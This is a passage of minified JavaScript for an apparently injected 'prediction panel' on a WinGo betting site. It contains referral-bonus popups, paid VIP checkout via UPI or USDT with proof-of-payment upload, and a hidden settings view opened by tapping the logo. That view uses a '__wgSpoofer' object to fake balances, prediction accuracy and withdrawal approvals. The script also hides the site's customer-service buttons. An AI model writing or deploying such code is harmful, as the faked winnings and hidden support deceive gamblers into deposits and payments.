      <h2 class="bonus-h2">Invite &amp; Earn</h2>
      <p class="bonus-sub">
        Refer friends and earn commission on every deposit they make. No limits.
      </p>
    </div>
    <div class="bonus-stats-row">
      <div class="bonus-stat">
        <span class="bonus-stat-val">₹1,000</span
        ><span class="bonus-stat-lbl">Per referral</span>
      </div>
      <div class="bonus-stat">
        <span class="bonus-stat-val">∞</span
        ><span class="bonus-stat-lbl">No cap</span>
      </div>
      <div class="bonus-stat">
        <span class="bonus-stat-val">Instant</span
        ><span class="bonus-stat-lbl">Payout</span>
      </div>
    </div>
    <div class="bonus-prog-card">
      <div class="bonus-prog-lbl">
        <span>Your progress</span
        ><span class="bonus-prog-count">0 / 10 Qualified</span>
      </div>
      <div class="bonus-bar"><div class="bonus-bar-fill"></div></div>
    </div>
    <div class="bonus-tiers">
      <div class="bonus-section-ttl">Reward Tiers</div>
      <div class="bonus-tier">
        <span class="tier-badge t-bronze">5</span
        ><span class="tier-info"
          >5 referrals → <b>₹5,000</b> + Bronze badge</span
        >
      </div>
      <div class="bonus-tier">
        <span class="tier-badge t-silver">10</span
        ><span class="tier-info"
          >10 referrals → <b>₹10,000</b> + Silver badge</span
        >
      </div>
      <div class="bonus-tier">
        <span class="tier-badge t-gold">25</span
        ><span class="tier-info"
          >25 referrals → <b>₹30,000</b> + Gold badge</span
        >
      </div>
      <div class="bonus-tier">
        <span class="tier-badge t-diamond">50</span
        ><span class="tier-info"
          >50 referrals → <b>₹75,000</b> + VIP access</span
        >
      </div>
    </div>
    <button class="bonus-cta-btn" id="btn-copy-invite">Copy Invite Link</button>
    <div class="bonus-link-preview" id="bonus-link-preview"></div>
    <div class="bonus-rules">
      <div class="bonus-section-ttl">How it works</div>
      <div class="bonus-rule">
        1. Share your unique invite link with friends
      </div>
      <div class="bonus-rule">2. Friend registers using your link</div>
      <div class="bonus-rule">
        3. Friend makes their first deposit (min ₹500)
      </div>
      <div class="bonus-rule">4. Bonus credited instantly to your wallet</div>
    </div>
    <div class="bonus-rules">
      <div class="bonus-section-ttl">Terms</div>
      <div class="bonus-rule">
        • Referral must make a minimum first deposit of ₹500
      </div>
      <div class="bonus-rule">• Self-referral is not permitted</div>
      <div class="bonus-rule">• Bonus is credited as withdrawable balance</div>
      <div class="bonus-rule">
        • Management reserves the right to modify terms
      </div>
    </div>
  </div>
</div>
<div class="wg-overlay inactive" id="wg-promo-overlay"></div>
<div class="wg-popup inactive" id="wg-promo-banner">
  <div class="wg-close-x" id="wg-promo-close">✕</div>
  <div class="wg-pop-hero">
    <div class="wg-pop-icon">💰</div>
    <div class="wg-pop-amount">FREE ₹1,000</div>
    <div class="wg-pop-pill">
      Per Referral &bull; No Limit &bull; Instant Payout
    </div>
  </div>
  <div class="wg-pop-stats">
    <div class="wg-stat-chip">💸 Instant</div>
    <div class="wg-stat-chip">♾️ No Cap</div>
    <div class="wg-stat-chip">✅ Verified</div>
  </div>
  <div class="wg-pop-body">
    Invite friends to join. Every time they deposit, you earn ₹1,000 commission
    — instantly credited, zero waiting.
  </div>
  <button class="wg-pop-cta" id="wg-promo-cta">🎁 Claim Free Bonus →</button>
  <div class="wg-pop-footer">
    <div
      class="wg-checkbox"
      id="wg-promo-check"
      role="checkbox"
      aria-checked="false"
    >
      <div class="wg-checkbox__icon"><span class="wg-check-tick">✓</span></div>
    </div>
    <span class="wg-no-remind" id="wg-promo-remind"
      >No More Reminders Today</span
    >
  </div>
</div>

`),
          (this._logo = n.querySelector(".logo")),
          (this._panel = n.querySelector(".panel")),
          (this._header = n.querySelector(".panel-header")),
          (this._closeBtn = n.querySelector(".close-btn")),
          (this._gateView = n.querySelector(".gate-view")),
          (this._body = n.querySelector(".panel-body")),
          (this._gateBal = n.querySelector("#gate-bal")),
          Io(n),
          Bn(this, Dn("logo")),
          Si(this, this._logo, { onTap: () => this._showPanel() }),
          Ei(this, this._header, this._panel),
          this._closeBtn.addEventListener("pointerdown", (M) =>
            M.stopPropagation(),
          ),
          this._closeBtn.addEventListener("click", () => this._showLogo()),
          n
            .querySelector(".btn-deposit")
            .addEventListener("click", () => (location.href = xo)),
          n
            .querySelector(".btn-telegram")
            .addEventListener("click", () =>
              window.open("https://telegram.dog/predictwingoo", "_blank"),
            ),
          n.querySelector("#btn-pro").addEventListener("click", () => {
            (this._setView("pro"),
              li(-1),
              tn("loading"),
              ri(),
              this._checkBalance());
          }),
          n
            .querySelector("#btn-status-tg")
            .addEventListener("click", () => this._setView("tg")),
          n
            .querySelector("#btn-vip")
            .addEventListener("click", () => this._setView("vip")),
          n.querySelector("#btn-mine").addEventListener("click", () => {
            (this._setView("mining"), this._checkBalance());
          }),
          n
            .querySelector("#btn-tg-back")
            .addEventListener("click", () => this._setView("menu")),
          n
            .querySelector("#btn-vip-back")
            .addEventListener("click", () => this._setView("menu")),
          n
            .querySelector("#btn-pro-back")
            .addEventListener("click", () => this._setView("menu")),
          n
            .querySelector("#btn-vip-pay-back")
            .addEventListener("click", () => this._setView("vip")),
          n
            .querySelector("#btn-tg-join")
            .addEventListener("click", () =>
              window.open("https://telegram.dog/predictwingoo", "_blank"),
            ),
          n
            .querySelector("#btn-vip-checkout")
            .addEventListener("click", () => this._setView("vip-pay")),
          n
            .querySelector("#btn-pay-upi")
            .addEventListener("click", () => this._startVipCheckout("upi")),
          n
            .querySelector("#btn-pay-crypto")
            .addEventListener("click", () => this._startVipCheckout("crypto")),
          n
            .querySelector("#btn-vip-checkout-back")
            .addEventListener("click", () => {
              if ((this._setView("vip-pay"), qn)) clearInterval(qn);
            }),
          n.querySelector("#btn-vip-confirm").addEventListener("click", () => {
            (this._setView("vip-submit"),
              (n.querySelector("#vip-utr-input").value = ""),
              (n.querySelector("#vip-file-input").value = ""),
              (n.querySelector("#vip-file-preview").style.display = "none"),
              (n.querySelector("#vip-file-placeholder").style.display = "flex"),
              (n.querySelector("#btn-vip-file-remove").style.display = "none"));
          }),
          n
            .querySelector("#btn-vip-submit-back")
            .addEventListener("click", () => {
              this._setView("vip-checkout");
            }),
          n.querySelector("#btn-vip-history").addEventListener("click", () => {
            (this._renderVipHistory(),
              this._setView("vip-history"),
              this._syncVipHistory());
          }),
          n
            .querySelector("#btn-vip-history-back")
            .addEventListener("click", () => {
              this._setView("vip-pay");
            }),
          n.querySelector("#vip-file-zone").addEventListener("click", () => {
            n.querySelector("#vip-file-input").click();
          }),
          n.querySelector("#vip-file-input").addEventListener("change", (M) => {
            let J = M.target.files[0];
            if (J) {
              let z = new FileReader();
              ((z.onload = (O) => {
                ((n.querySelector("#vip-file-preview").src = O.target.result),
                  (n.querySelector("#vip-file-preview").style.display =
                    "block"),
                  (n.querySelector("#vip-file-placeholder").style.display =
                    "none"),
                  (n.querySelector("#btn-vip-file-remove").style.display =
                    "flex"));
              }),
                z.readAsDataURL(J));
            }
          }),
          n
            .querySelector("#btn-vip-file-remove")
            .addEventListener("click", (M) => {
              (M.preventDefault(),
                M.stopPropagation(),
                (n.querySelector("#vip-file-input").value = ""));
              let J = n.querySelector("#vip-file-preview");
              ((J.src = ""),
                (J.style.display = "none"),
                (n.querySelector("#vip-file-placeholder").style.display =
                  "flex"),
                (n.querySelector("#btn-vip-file-remove").style.display =
                  "none"));
            }),
          n
            .querySelector("#btn-vip-submit-proof")
            .addEventListener("click", () => {
              let M = n.querySelector("#vip-utr-input"),
                J = n.querySelector("#vip-file-input"),
                z = M.value.trim();
              if (!z) {
                alert("Please enter your UTR / Transaction Hash");
                return;
              }
              let O = n.querySelector("#btn-vip-submit-proof");
              ((O.textContent = "Uploading..."), (O.disabled = !0));
              let E = new FormData();
              (E.append("utr", z),
                E.append("type", this._checkoutType || "upi"),
                E.append(
                  "amount",
                  this._checkoutType === "crypto"
                    ? A.cryptoAmountUsd.toFixed(2) + " USDT"
                    : "₹" + A.amount,
                ));
              let e = "Unknown";
              try {
                e =
                  sessionStorage.getItem("wg_user") ||
                  localStorage.getItem("wg_user") ||
                  "Unknown";
              } catch (y) {}
              if ((E.append("user", e), J.files[0]))
                E.append("screenshot", J.files[0]);
              fetch("/ar-api/vip-submit", { method: "POST", body: E })
                .then((y) => y.json())
                .then((y) => {
                  if (y.ok) {
                    let v = [];
                    try {
                      v = JSON.parse(
                        localStorage.getItem("wg_vip_orders") || "[]",
                      );
                    } catch (q) {}
                    (v.unshift({
                      type: this._checkoutType || "upi",
                      utr: z,
                      date: Date.now(),
                      status: "Pending",
                    }),
                      localStorage.setItem("wg_vip_orders", JSON.stringify(v)),
                      (O.textContent = "Submitted ✓"),
                      (O.style.cssText =
                        "background: #10b981; color: #fff; border-color: #10b981;"),
                      setTimeout(() => {
                        ((O.textContent = "Submit Proof"),
                          (O.style.cssText = ""),
                          (O.disabled = !1),
                          this._renderVipHistory(),
                          this._setView("vip-history"));
                      }, 1500));
                  } else
                    (alert(
                      y.error || "Failed to submit proof. Please try again.",
                    ),
                      (O.textContent = "Submit Proof"),
                      (O.disabled = !1));
                })
                .catch((y) => {
                  (console.error(y),
                    alert("Connection error. Please try again."),
                    (O.textContent = "Submit Proof"),
                    (O.disabled = !1));
                });
            }),
          n.querySelector("#btn-vip-copy").addEventListener("click", () => {
            let M = n.querySelector("#vip-address-val").textContent;
            ((z) => {
              let O = document.createElement("textarea");
              ((O.value = z),
                (O.style.position = "fixed"),
                (O.style.opacity = "0"),
                (O.style.left = "-9999px"),
                n.appendChild(O),
                O.focus(),
                O.select(),
                O.setSelectionRange(0, 99999));
              let E = !1;
              try {
                E = document.execCommand("copy");
              } catch (e) {}
              if ((n.removeChild(O), E)) return Promise.resolve();
              if (navigator.clipboard) return navigator.clipboard.writeText(z);
              return Promise.reject();
            })(M)
              .then(() => {
                let z = n.querySelector("#btn-vip-copy"),
                  O = z.textContent;
                ((z.textContent = "Copied!"),
                  z.classList.add("copied"),
                  setTimeout(() => {
                    ((z.textContent = O), z.classList.remove("copied"));
                  }, 2000));
              })
              .catch((z) => {
                console.error("Copy failed:", z);
              });
          }),
          n.querySelector("#vip-upi-hint").addEventListener("click", () => {
            Rn = (Rn + 1) % A.upi.length;
            let M = A.upi[Rn];
            n.querySelector("#vip-address-val").textContent = M;
            let J = encodeURIComponent(M),
              z = encodeURIComponent("VIP"),
              O = encodeURIComponent(A.amount),
              E = `upi://pay?pa=${J}&pn=${z}&am=${O}&cu=INR`,
              e = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(E)}`;
            n.querySelector("#vip-qr-img").src = e;
          }),
          n
            .querySelector("#btn-settings-back")
            .addEventListener("click", () => this._setView("menu")),
          n.querySelector("#btn-spoof-reset").addEventListener("click", () => {
            (window.__wgSpoofer.saveSetting("accuracy", 70),
              window.__wgSpoofer.saveSetting("balanceOffset", 5000),
              window.__wgSpoofer.resetBalance(),
              this._syncSettings());
          }));
        let t = [],
          i = n.querySelector(".panel-title img");
        i.style.pointerEvents = "auto";
        let o = () => {
          if (!window.__wgSpoofer || !window.__wgSpoofer.isVip()) return;
          if ((t.push(Date.now()), t.length >= 5)) {
            if (t[t.length - 1] - t[t.length - 5] < 2000)
              ((t.length = 0), this._setView("settings"), this._syncSettings());
            if (t.length > 10) t.splice(0, t.length - 5);
          }
        };
        (i.addEventListener(
          "pointerdown",
          (M) => {
            (M.stopImmediatePropagation(), M.stopPropagation());
          },
          !0,
        ),
          i.addEventListener("pointerup", o, !0),
          i.addEventListener("click", o));
        let c = n.querySelector("#spoof-acc-range"),
          l = n.querySelector("#spoof-acc-num"),
          p = n.querySelector("#spoof-bal");
        (c.addEventListener("input", () => {
          ((l.value = c.value),
            window.__wgSpoofer.saveSetting("accuracy", parseInt(c.value)));
        }),
          l.addEventListener("input", () => {
            ((c.value = l.value),
              window.__wgSpoofer.saveSetting("accuracy", parseInt(l.value)));
          }),
          p.addEventListener("input", () => {
            (window.__wgSpoofer.saveSetting(
              "balanceOffset",
              parseInt(p.value) || 0,
            ),
              window.__wgSpoofer.resetBalance());
          }));
        let f = n.querySelector("#spoof-withdrawals-list");
        if (f)
          f.addEventListener("click", (M) => {
            let J = M.target.closest("button[data-id]");
            if (!J) return;
            let z = J.getAttribute("data-id"),
              O = J.classList.contains("btn-approve") ? 1 : 0;
            if (window.__wgSpoofer)
              window.__wgSpoofer.updateWithdrawalStatus(z, O);
            this._renderWithdrawals();
          });
        let u = Vn();
        if (u) {
          let M = n.querySelector("#pro-mode");
          if (M) M.textContent = pt(u);
          if (!lt().length) on();
        }
        let w = document.createElement("style");
        ((w.textContent = ".customer,.changlongEnter{display:none!important}"),
          document.head.appendChild(w),
          Ji(n),
          Oi(n),
          en(n),
          Wi(500),
          Li());
        let S = () => {
          let M = document.querySelector("#app");
          if (!M) return;
          let J = M.getBoundingClientRect();
          (this.style.setProperty("--bv-left", J.left + "px"),
            this.style.setProperty("--bv-width", J.width + "px"));
        };
        (S(), new ResizeObserver(S).observe(document.documentElement));
        let W = (M) => {
          if (typeof M?.detail?.balance === "number")
            window.__wg_balance = M.detail.balance;
          if (this._gateView.style.display === "block") this._checkBalance();
        };
        (window.addEventListener("wg-qualified", W),
          window.addEventListener("wg-balance", W));
      }
      _checkBalance() {
        if (sessionStorage.getItem("wg_qualified")) {
          ((this._body.style.display = "block"),
            (this._gateView.style.display = "none"));
          return;
        }
        let n = window.__wg_balance || 0;
        if (window.__wgSpoofer && window.__wgSpoofer.isVip())
          try {
            let t = JSON.parse(localStorage.getItem("wg_spoof_state"));
            if (t && t.balance !== null) n = t.balance;
          } catch (t) {}
        if (((this._gateBal.textContent = "₹" + Number(n).toFixed(2)), n < 500))
          ((this._body.style.display = "none"),
            (this._gateView.style.display = "block"));
        else
          ((this._body.style.display = "block"),
            (this._gateView.style.display = "none"));
      }
      _showPanel() {
        ((this._mode = "panel"), (this._logo.style.display = "none"));
        let n = this._gateView.style.display === "block";
        if ((this._panel.classList.add("active"), n))
          ((this._body.style.display = "block"),
            (this._gateView.style.display = "none"),
            this._setView("menu"));
        let t = Dn("panel");
        if (t) Bn(this, t);
        else wi(this, this._panel);
      }
      _showLogo() {
        ((this._mode = "logo"),
          this._panel.classList.remove("active"),
          (this._logo.style.display = "block"),
          Bn(this, Dn("logo")));
      }
      _setView(n) {
        this.shadowRoot
          .querySelectorAll(".view")
          .forEach((i) => i.classList.remove("active"));
        let t = this.shadowRoot.querySelector(".view-" + n);
        if (t) t.classList.add("active");
      }
      _startVipCheckout(n) {
        this._checkoutType = n;
        let t = this.shadowRoot,
          i = t.querySelector("#vip-loader");
        ((i.style.display = "flex"),
          setTimeout(() => {
            i.style.display = "none";
            let c =
              "VIP-" +
              Math.floor(Math.random() * 16777215)
                .toString(16)
                .toUpperCase()
                .padStart(6, "0");
            if (((t.querySelector("#vip-order-id").textContent = c), qn))
              clearInterval(qn);
            let l = "",
              p = "",
              f = "";
            if (n === "upi") {
              Rn = 0;
              let S = A.upi;
              ((l = S[0]),
                (p = "₹" + A.amount),
                (t.querySelector("#vip-checkout-title").textContent =
                  "UPI Payment"),
                (t.querySelector("#vip-address-lbl").textContent = "UPI ID"),
                (t.querySelector("#vip-network-lbl").style.display = "none"));
              let W = encodeURIComponent(l),
                M = encodeURIComponent("VIP"),
                J = encodeURIComponent(A.amount),
                z = `upi://pay?pa=${W}&pn=${M}&am=${J}&cu=INR`;
              if (
                ((f = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(z)}`),
                S.length > 1)
              )
                t.querySelector("#vip-upi-hint").style.display = "flex";
              else t.querySelector("#vip-upi-hint").style.display = "none";
            } else
              ((l = A.crypto.trc20),
                (p = `$${A.cryptoAmountUsd.toFixed(2)} USDT`),
                (t.querySelector("#vip-checkout-title").textContent =
                  "Crypto USDT"),
                (t.querySelector("#vip-address-lbl").textContent =
                  "USDT Address"),
                (t.querySelector("#vip-network-lbl").style.display =
                  "inline-block"),
                (t.querySelector("#vip-upi-hint").style.display = "none"),
                (f = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(l)}`));
            ((t.querySelector("#vip-address-val").textContent = l),
              (t.querySelector("#vip-checkout-amount").textContent = p),
              (t.querySelector("#vip-qr-img").src = f));
            let u = bi(),
              w = () => {
                let S = xi(u);
                if (
                  ((t.querySelector("#vip-checkout-timer").textContent =
                    S.text),
                  S.done)
                )
                  clearInterval(qn);
              };
            if ((w(), u > Date.now())) qn = setInterval(w, 1000);
            this._setView("vip-checkout");
          }, 2500));
      }
      _renderVipHistory() {
        let t = this.shadowRoot.querySelector("#vip-history-list");
        if (!t) return;
        let i = [];
        try {
          i = JSON.parse(localStorage.getItem("wg_vip_orders") || "[]");
        } catch (o) {}
        if (i.length === 0) {
          t.innerHTML = `
          <div class="vip-history-empty">
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
              <circle cx="12" cy="12" r="10" />
              <polyline points="12 6 12 12 16 14" />
            </svg>
            <span class="vip-history-empty-title">No Orders Yet</span>
            <span class="vip-history-empty-sub">Completed payments will appear here</span>
          </div>`;
          return;
        }
        t.innerHTML = i
          .map((o) => {
            let c = new Date(o.date).toLocaleString(),
              l = String(o.type).toLowerCase() === "crypto",
              p = l ? "vip-history-crypto" : "vip-history-upi",
              f = l ? "Crypto" : "UPI",
              u = String(o.status || "Pending"),
              w =
                u === "Approved"
                  ? "status-approved"
                  : u === "Rejected"
                    ? "status-rejected"
                    : "status-pending",
              S =
                u === "Rejected" && o.remark
                  ? `<div class="vip-history-remark">${o.remark}</div>`
                  : "";
            return `
          <div class="vip-history-row ${p}">
            <div class="vip-history-row-top">
              <span class="vip-history-type">${f}</span>
              <span class="vip-history-status ${w}">${u}</span>
            </div>
            <span class="vip-history-ref">Ref · ${o.utr}</span>
            <span class="vip-history-date">${c}</span>
            ${S}
          </div>`;
          })
          .join("");
      }
      async _syncVipHistory() {
        let n = [];
        try {
          n = JSON.parse(localStorage.getItem("wg_vip_orders") || "[]");
        } catch (i) {}
        if (!n.length) return;
        let t = n.map((i) => i.utr).filter(Boolean);
        if (!t.length) return;
        try {
          let i = await fetch("/ar-api/vip-sync", {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify({ utrs: t }),
          });
          if (!i.ok) return;
          let o = await i.json();
          if (!o.ok || !o.orders) return;
          let c = !1;
          for (let l of n) {
            let p = o.orders[l.utr];
            if (!p) continue;
            if (l.status !== p.status || (l.remark || "") !== (p.remark || ""))
              ((l.status = p.status), (l.remark = p.remark || ""), (c = !0));
          }
          if (c)
            (localStorage.setItem("wg_vip_orders", JSON.stringify(n)),
              this._renderVipHistory());
        } catch (i) {}
      }
      _syncSettings() {
        if (!window.__wgSpoofer) return;
        let n = window.__wgSpoofer.getSettings(),
          t = this.shadowRoot;
        ((t.querySelector("#spoof-acc-range").value = n.accuracy),
          (t.querySelector("#spoof-acc-num").value = n.accuracy),
          (t.querySelector("#spoof-bal").value = n.balanceOffset),
          this._renderWithdrawals());
      }
      _renderWithdrawals() {
        if (!window.__wgSpoofer) return;
        let n = window.__wgSpoofer.getWithdrawals(),
          t = this.shadowRoot.querySelector("#spoof-withdrawals-list");
        if (!t) return;
        t.innerHTML = "";
        let i = [];
        for (let c in n) i.push(n[c]);
        i.sort((c, l) => l.addTime - c.addTime);
        let o = document.createDocumentFragment();
        (i.forEach((c) => {
          let l = document.createElement("div");
          l.className = "w-item";
          let p = "Processing",
            f = "status-processing";
          if (c.state === 1 || c.state === 2)
            ((p = "Success"), (f = "status-success"));
          else if (c.state === 0 || c.state === 4)
            ((p = "Failed"), (f = "status-failed"));
          ((l.innerHTML = `<div class="w-info"><div class="w-id">${c.withdrawNumber}</div><div class="w-amt">₹${c.amount}</div><div class="w-time">${new Date(c.addTime).toLocaleString()}</div><div class="w-state ${f}">${p}</div></div><div class="w-actions"><button class="btn-approve" data-id="${c.withdrawNumber}">Approve</button><button class="btn-reject" data-id="${c.withdrawNumber}">Reject</button></div>`),
            o.appendChild(l));
        }),
          t.appendChild(o));
      }
    },
  );
function Tn() {
  let n = location.hash.includes("/saasLottery/WinGo"),
    t = document.querySelector("prediction-panel");
  if (!t)
    ((t = document.createElement("prediction-panel")),
      document.body.appendChild(t));
  t.dataset.route = n ? "game" : "other";
  let i = document.querySelector(
      ".timer-card.active .card-title, .TimeLeft__C-name",
    ),
    o = String(i?.textContent || "")
      .toLowerCase()
      .replace(/\s+/g, ""),
    c = "";
  if (o.includes("wingo30")) c = "WinGo_30S";
  else if (o.includes("wingo1min") || o.includes("wingo1m")) c = "WinGo_1M";
  else if (o.includes("wingo3min") || o.includes("wingo3m")) c = "WinGo_3M";
  else if (o.includes("wingo5min") || o.includes("wingo5m")) c = "WinGo_5M";
  if (!c) {
    let l = location.hash.match(/gameCode=(WinGo_\w+)/);
    c = l ? l[1] : "";
  }
  if (c && c !== Vn()) vt(c);
}
["pushState", "replaceState"].forEach((n) => {
  let t = history[n];
  history[n] = function (...i) {
    (t.apply(this, i), Tn());
  };
});
window.addEventListener("hashchange", Tn);
setInterval(Tn, 500);
setTimeout(Tn, 100);
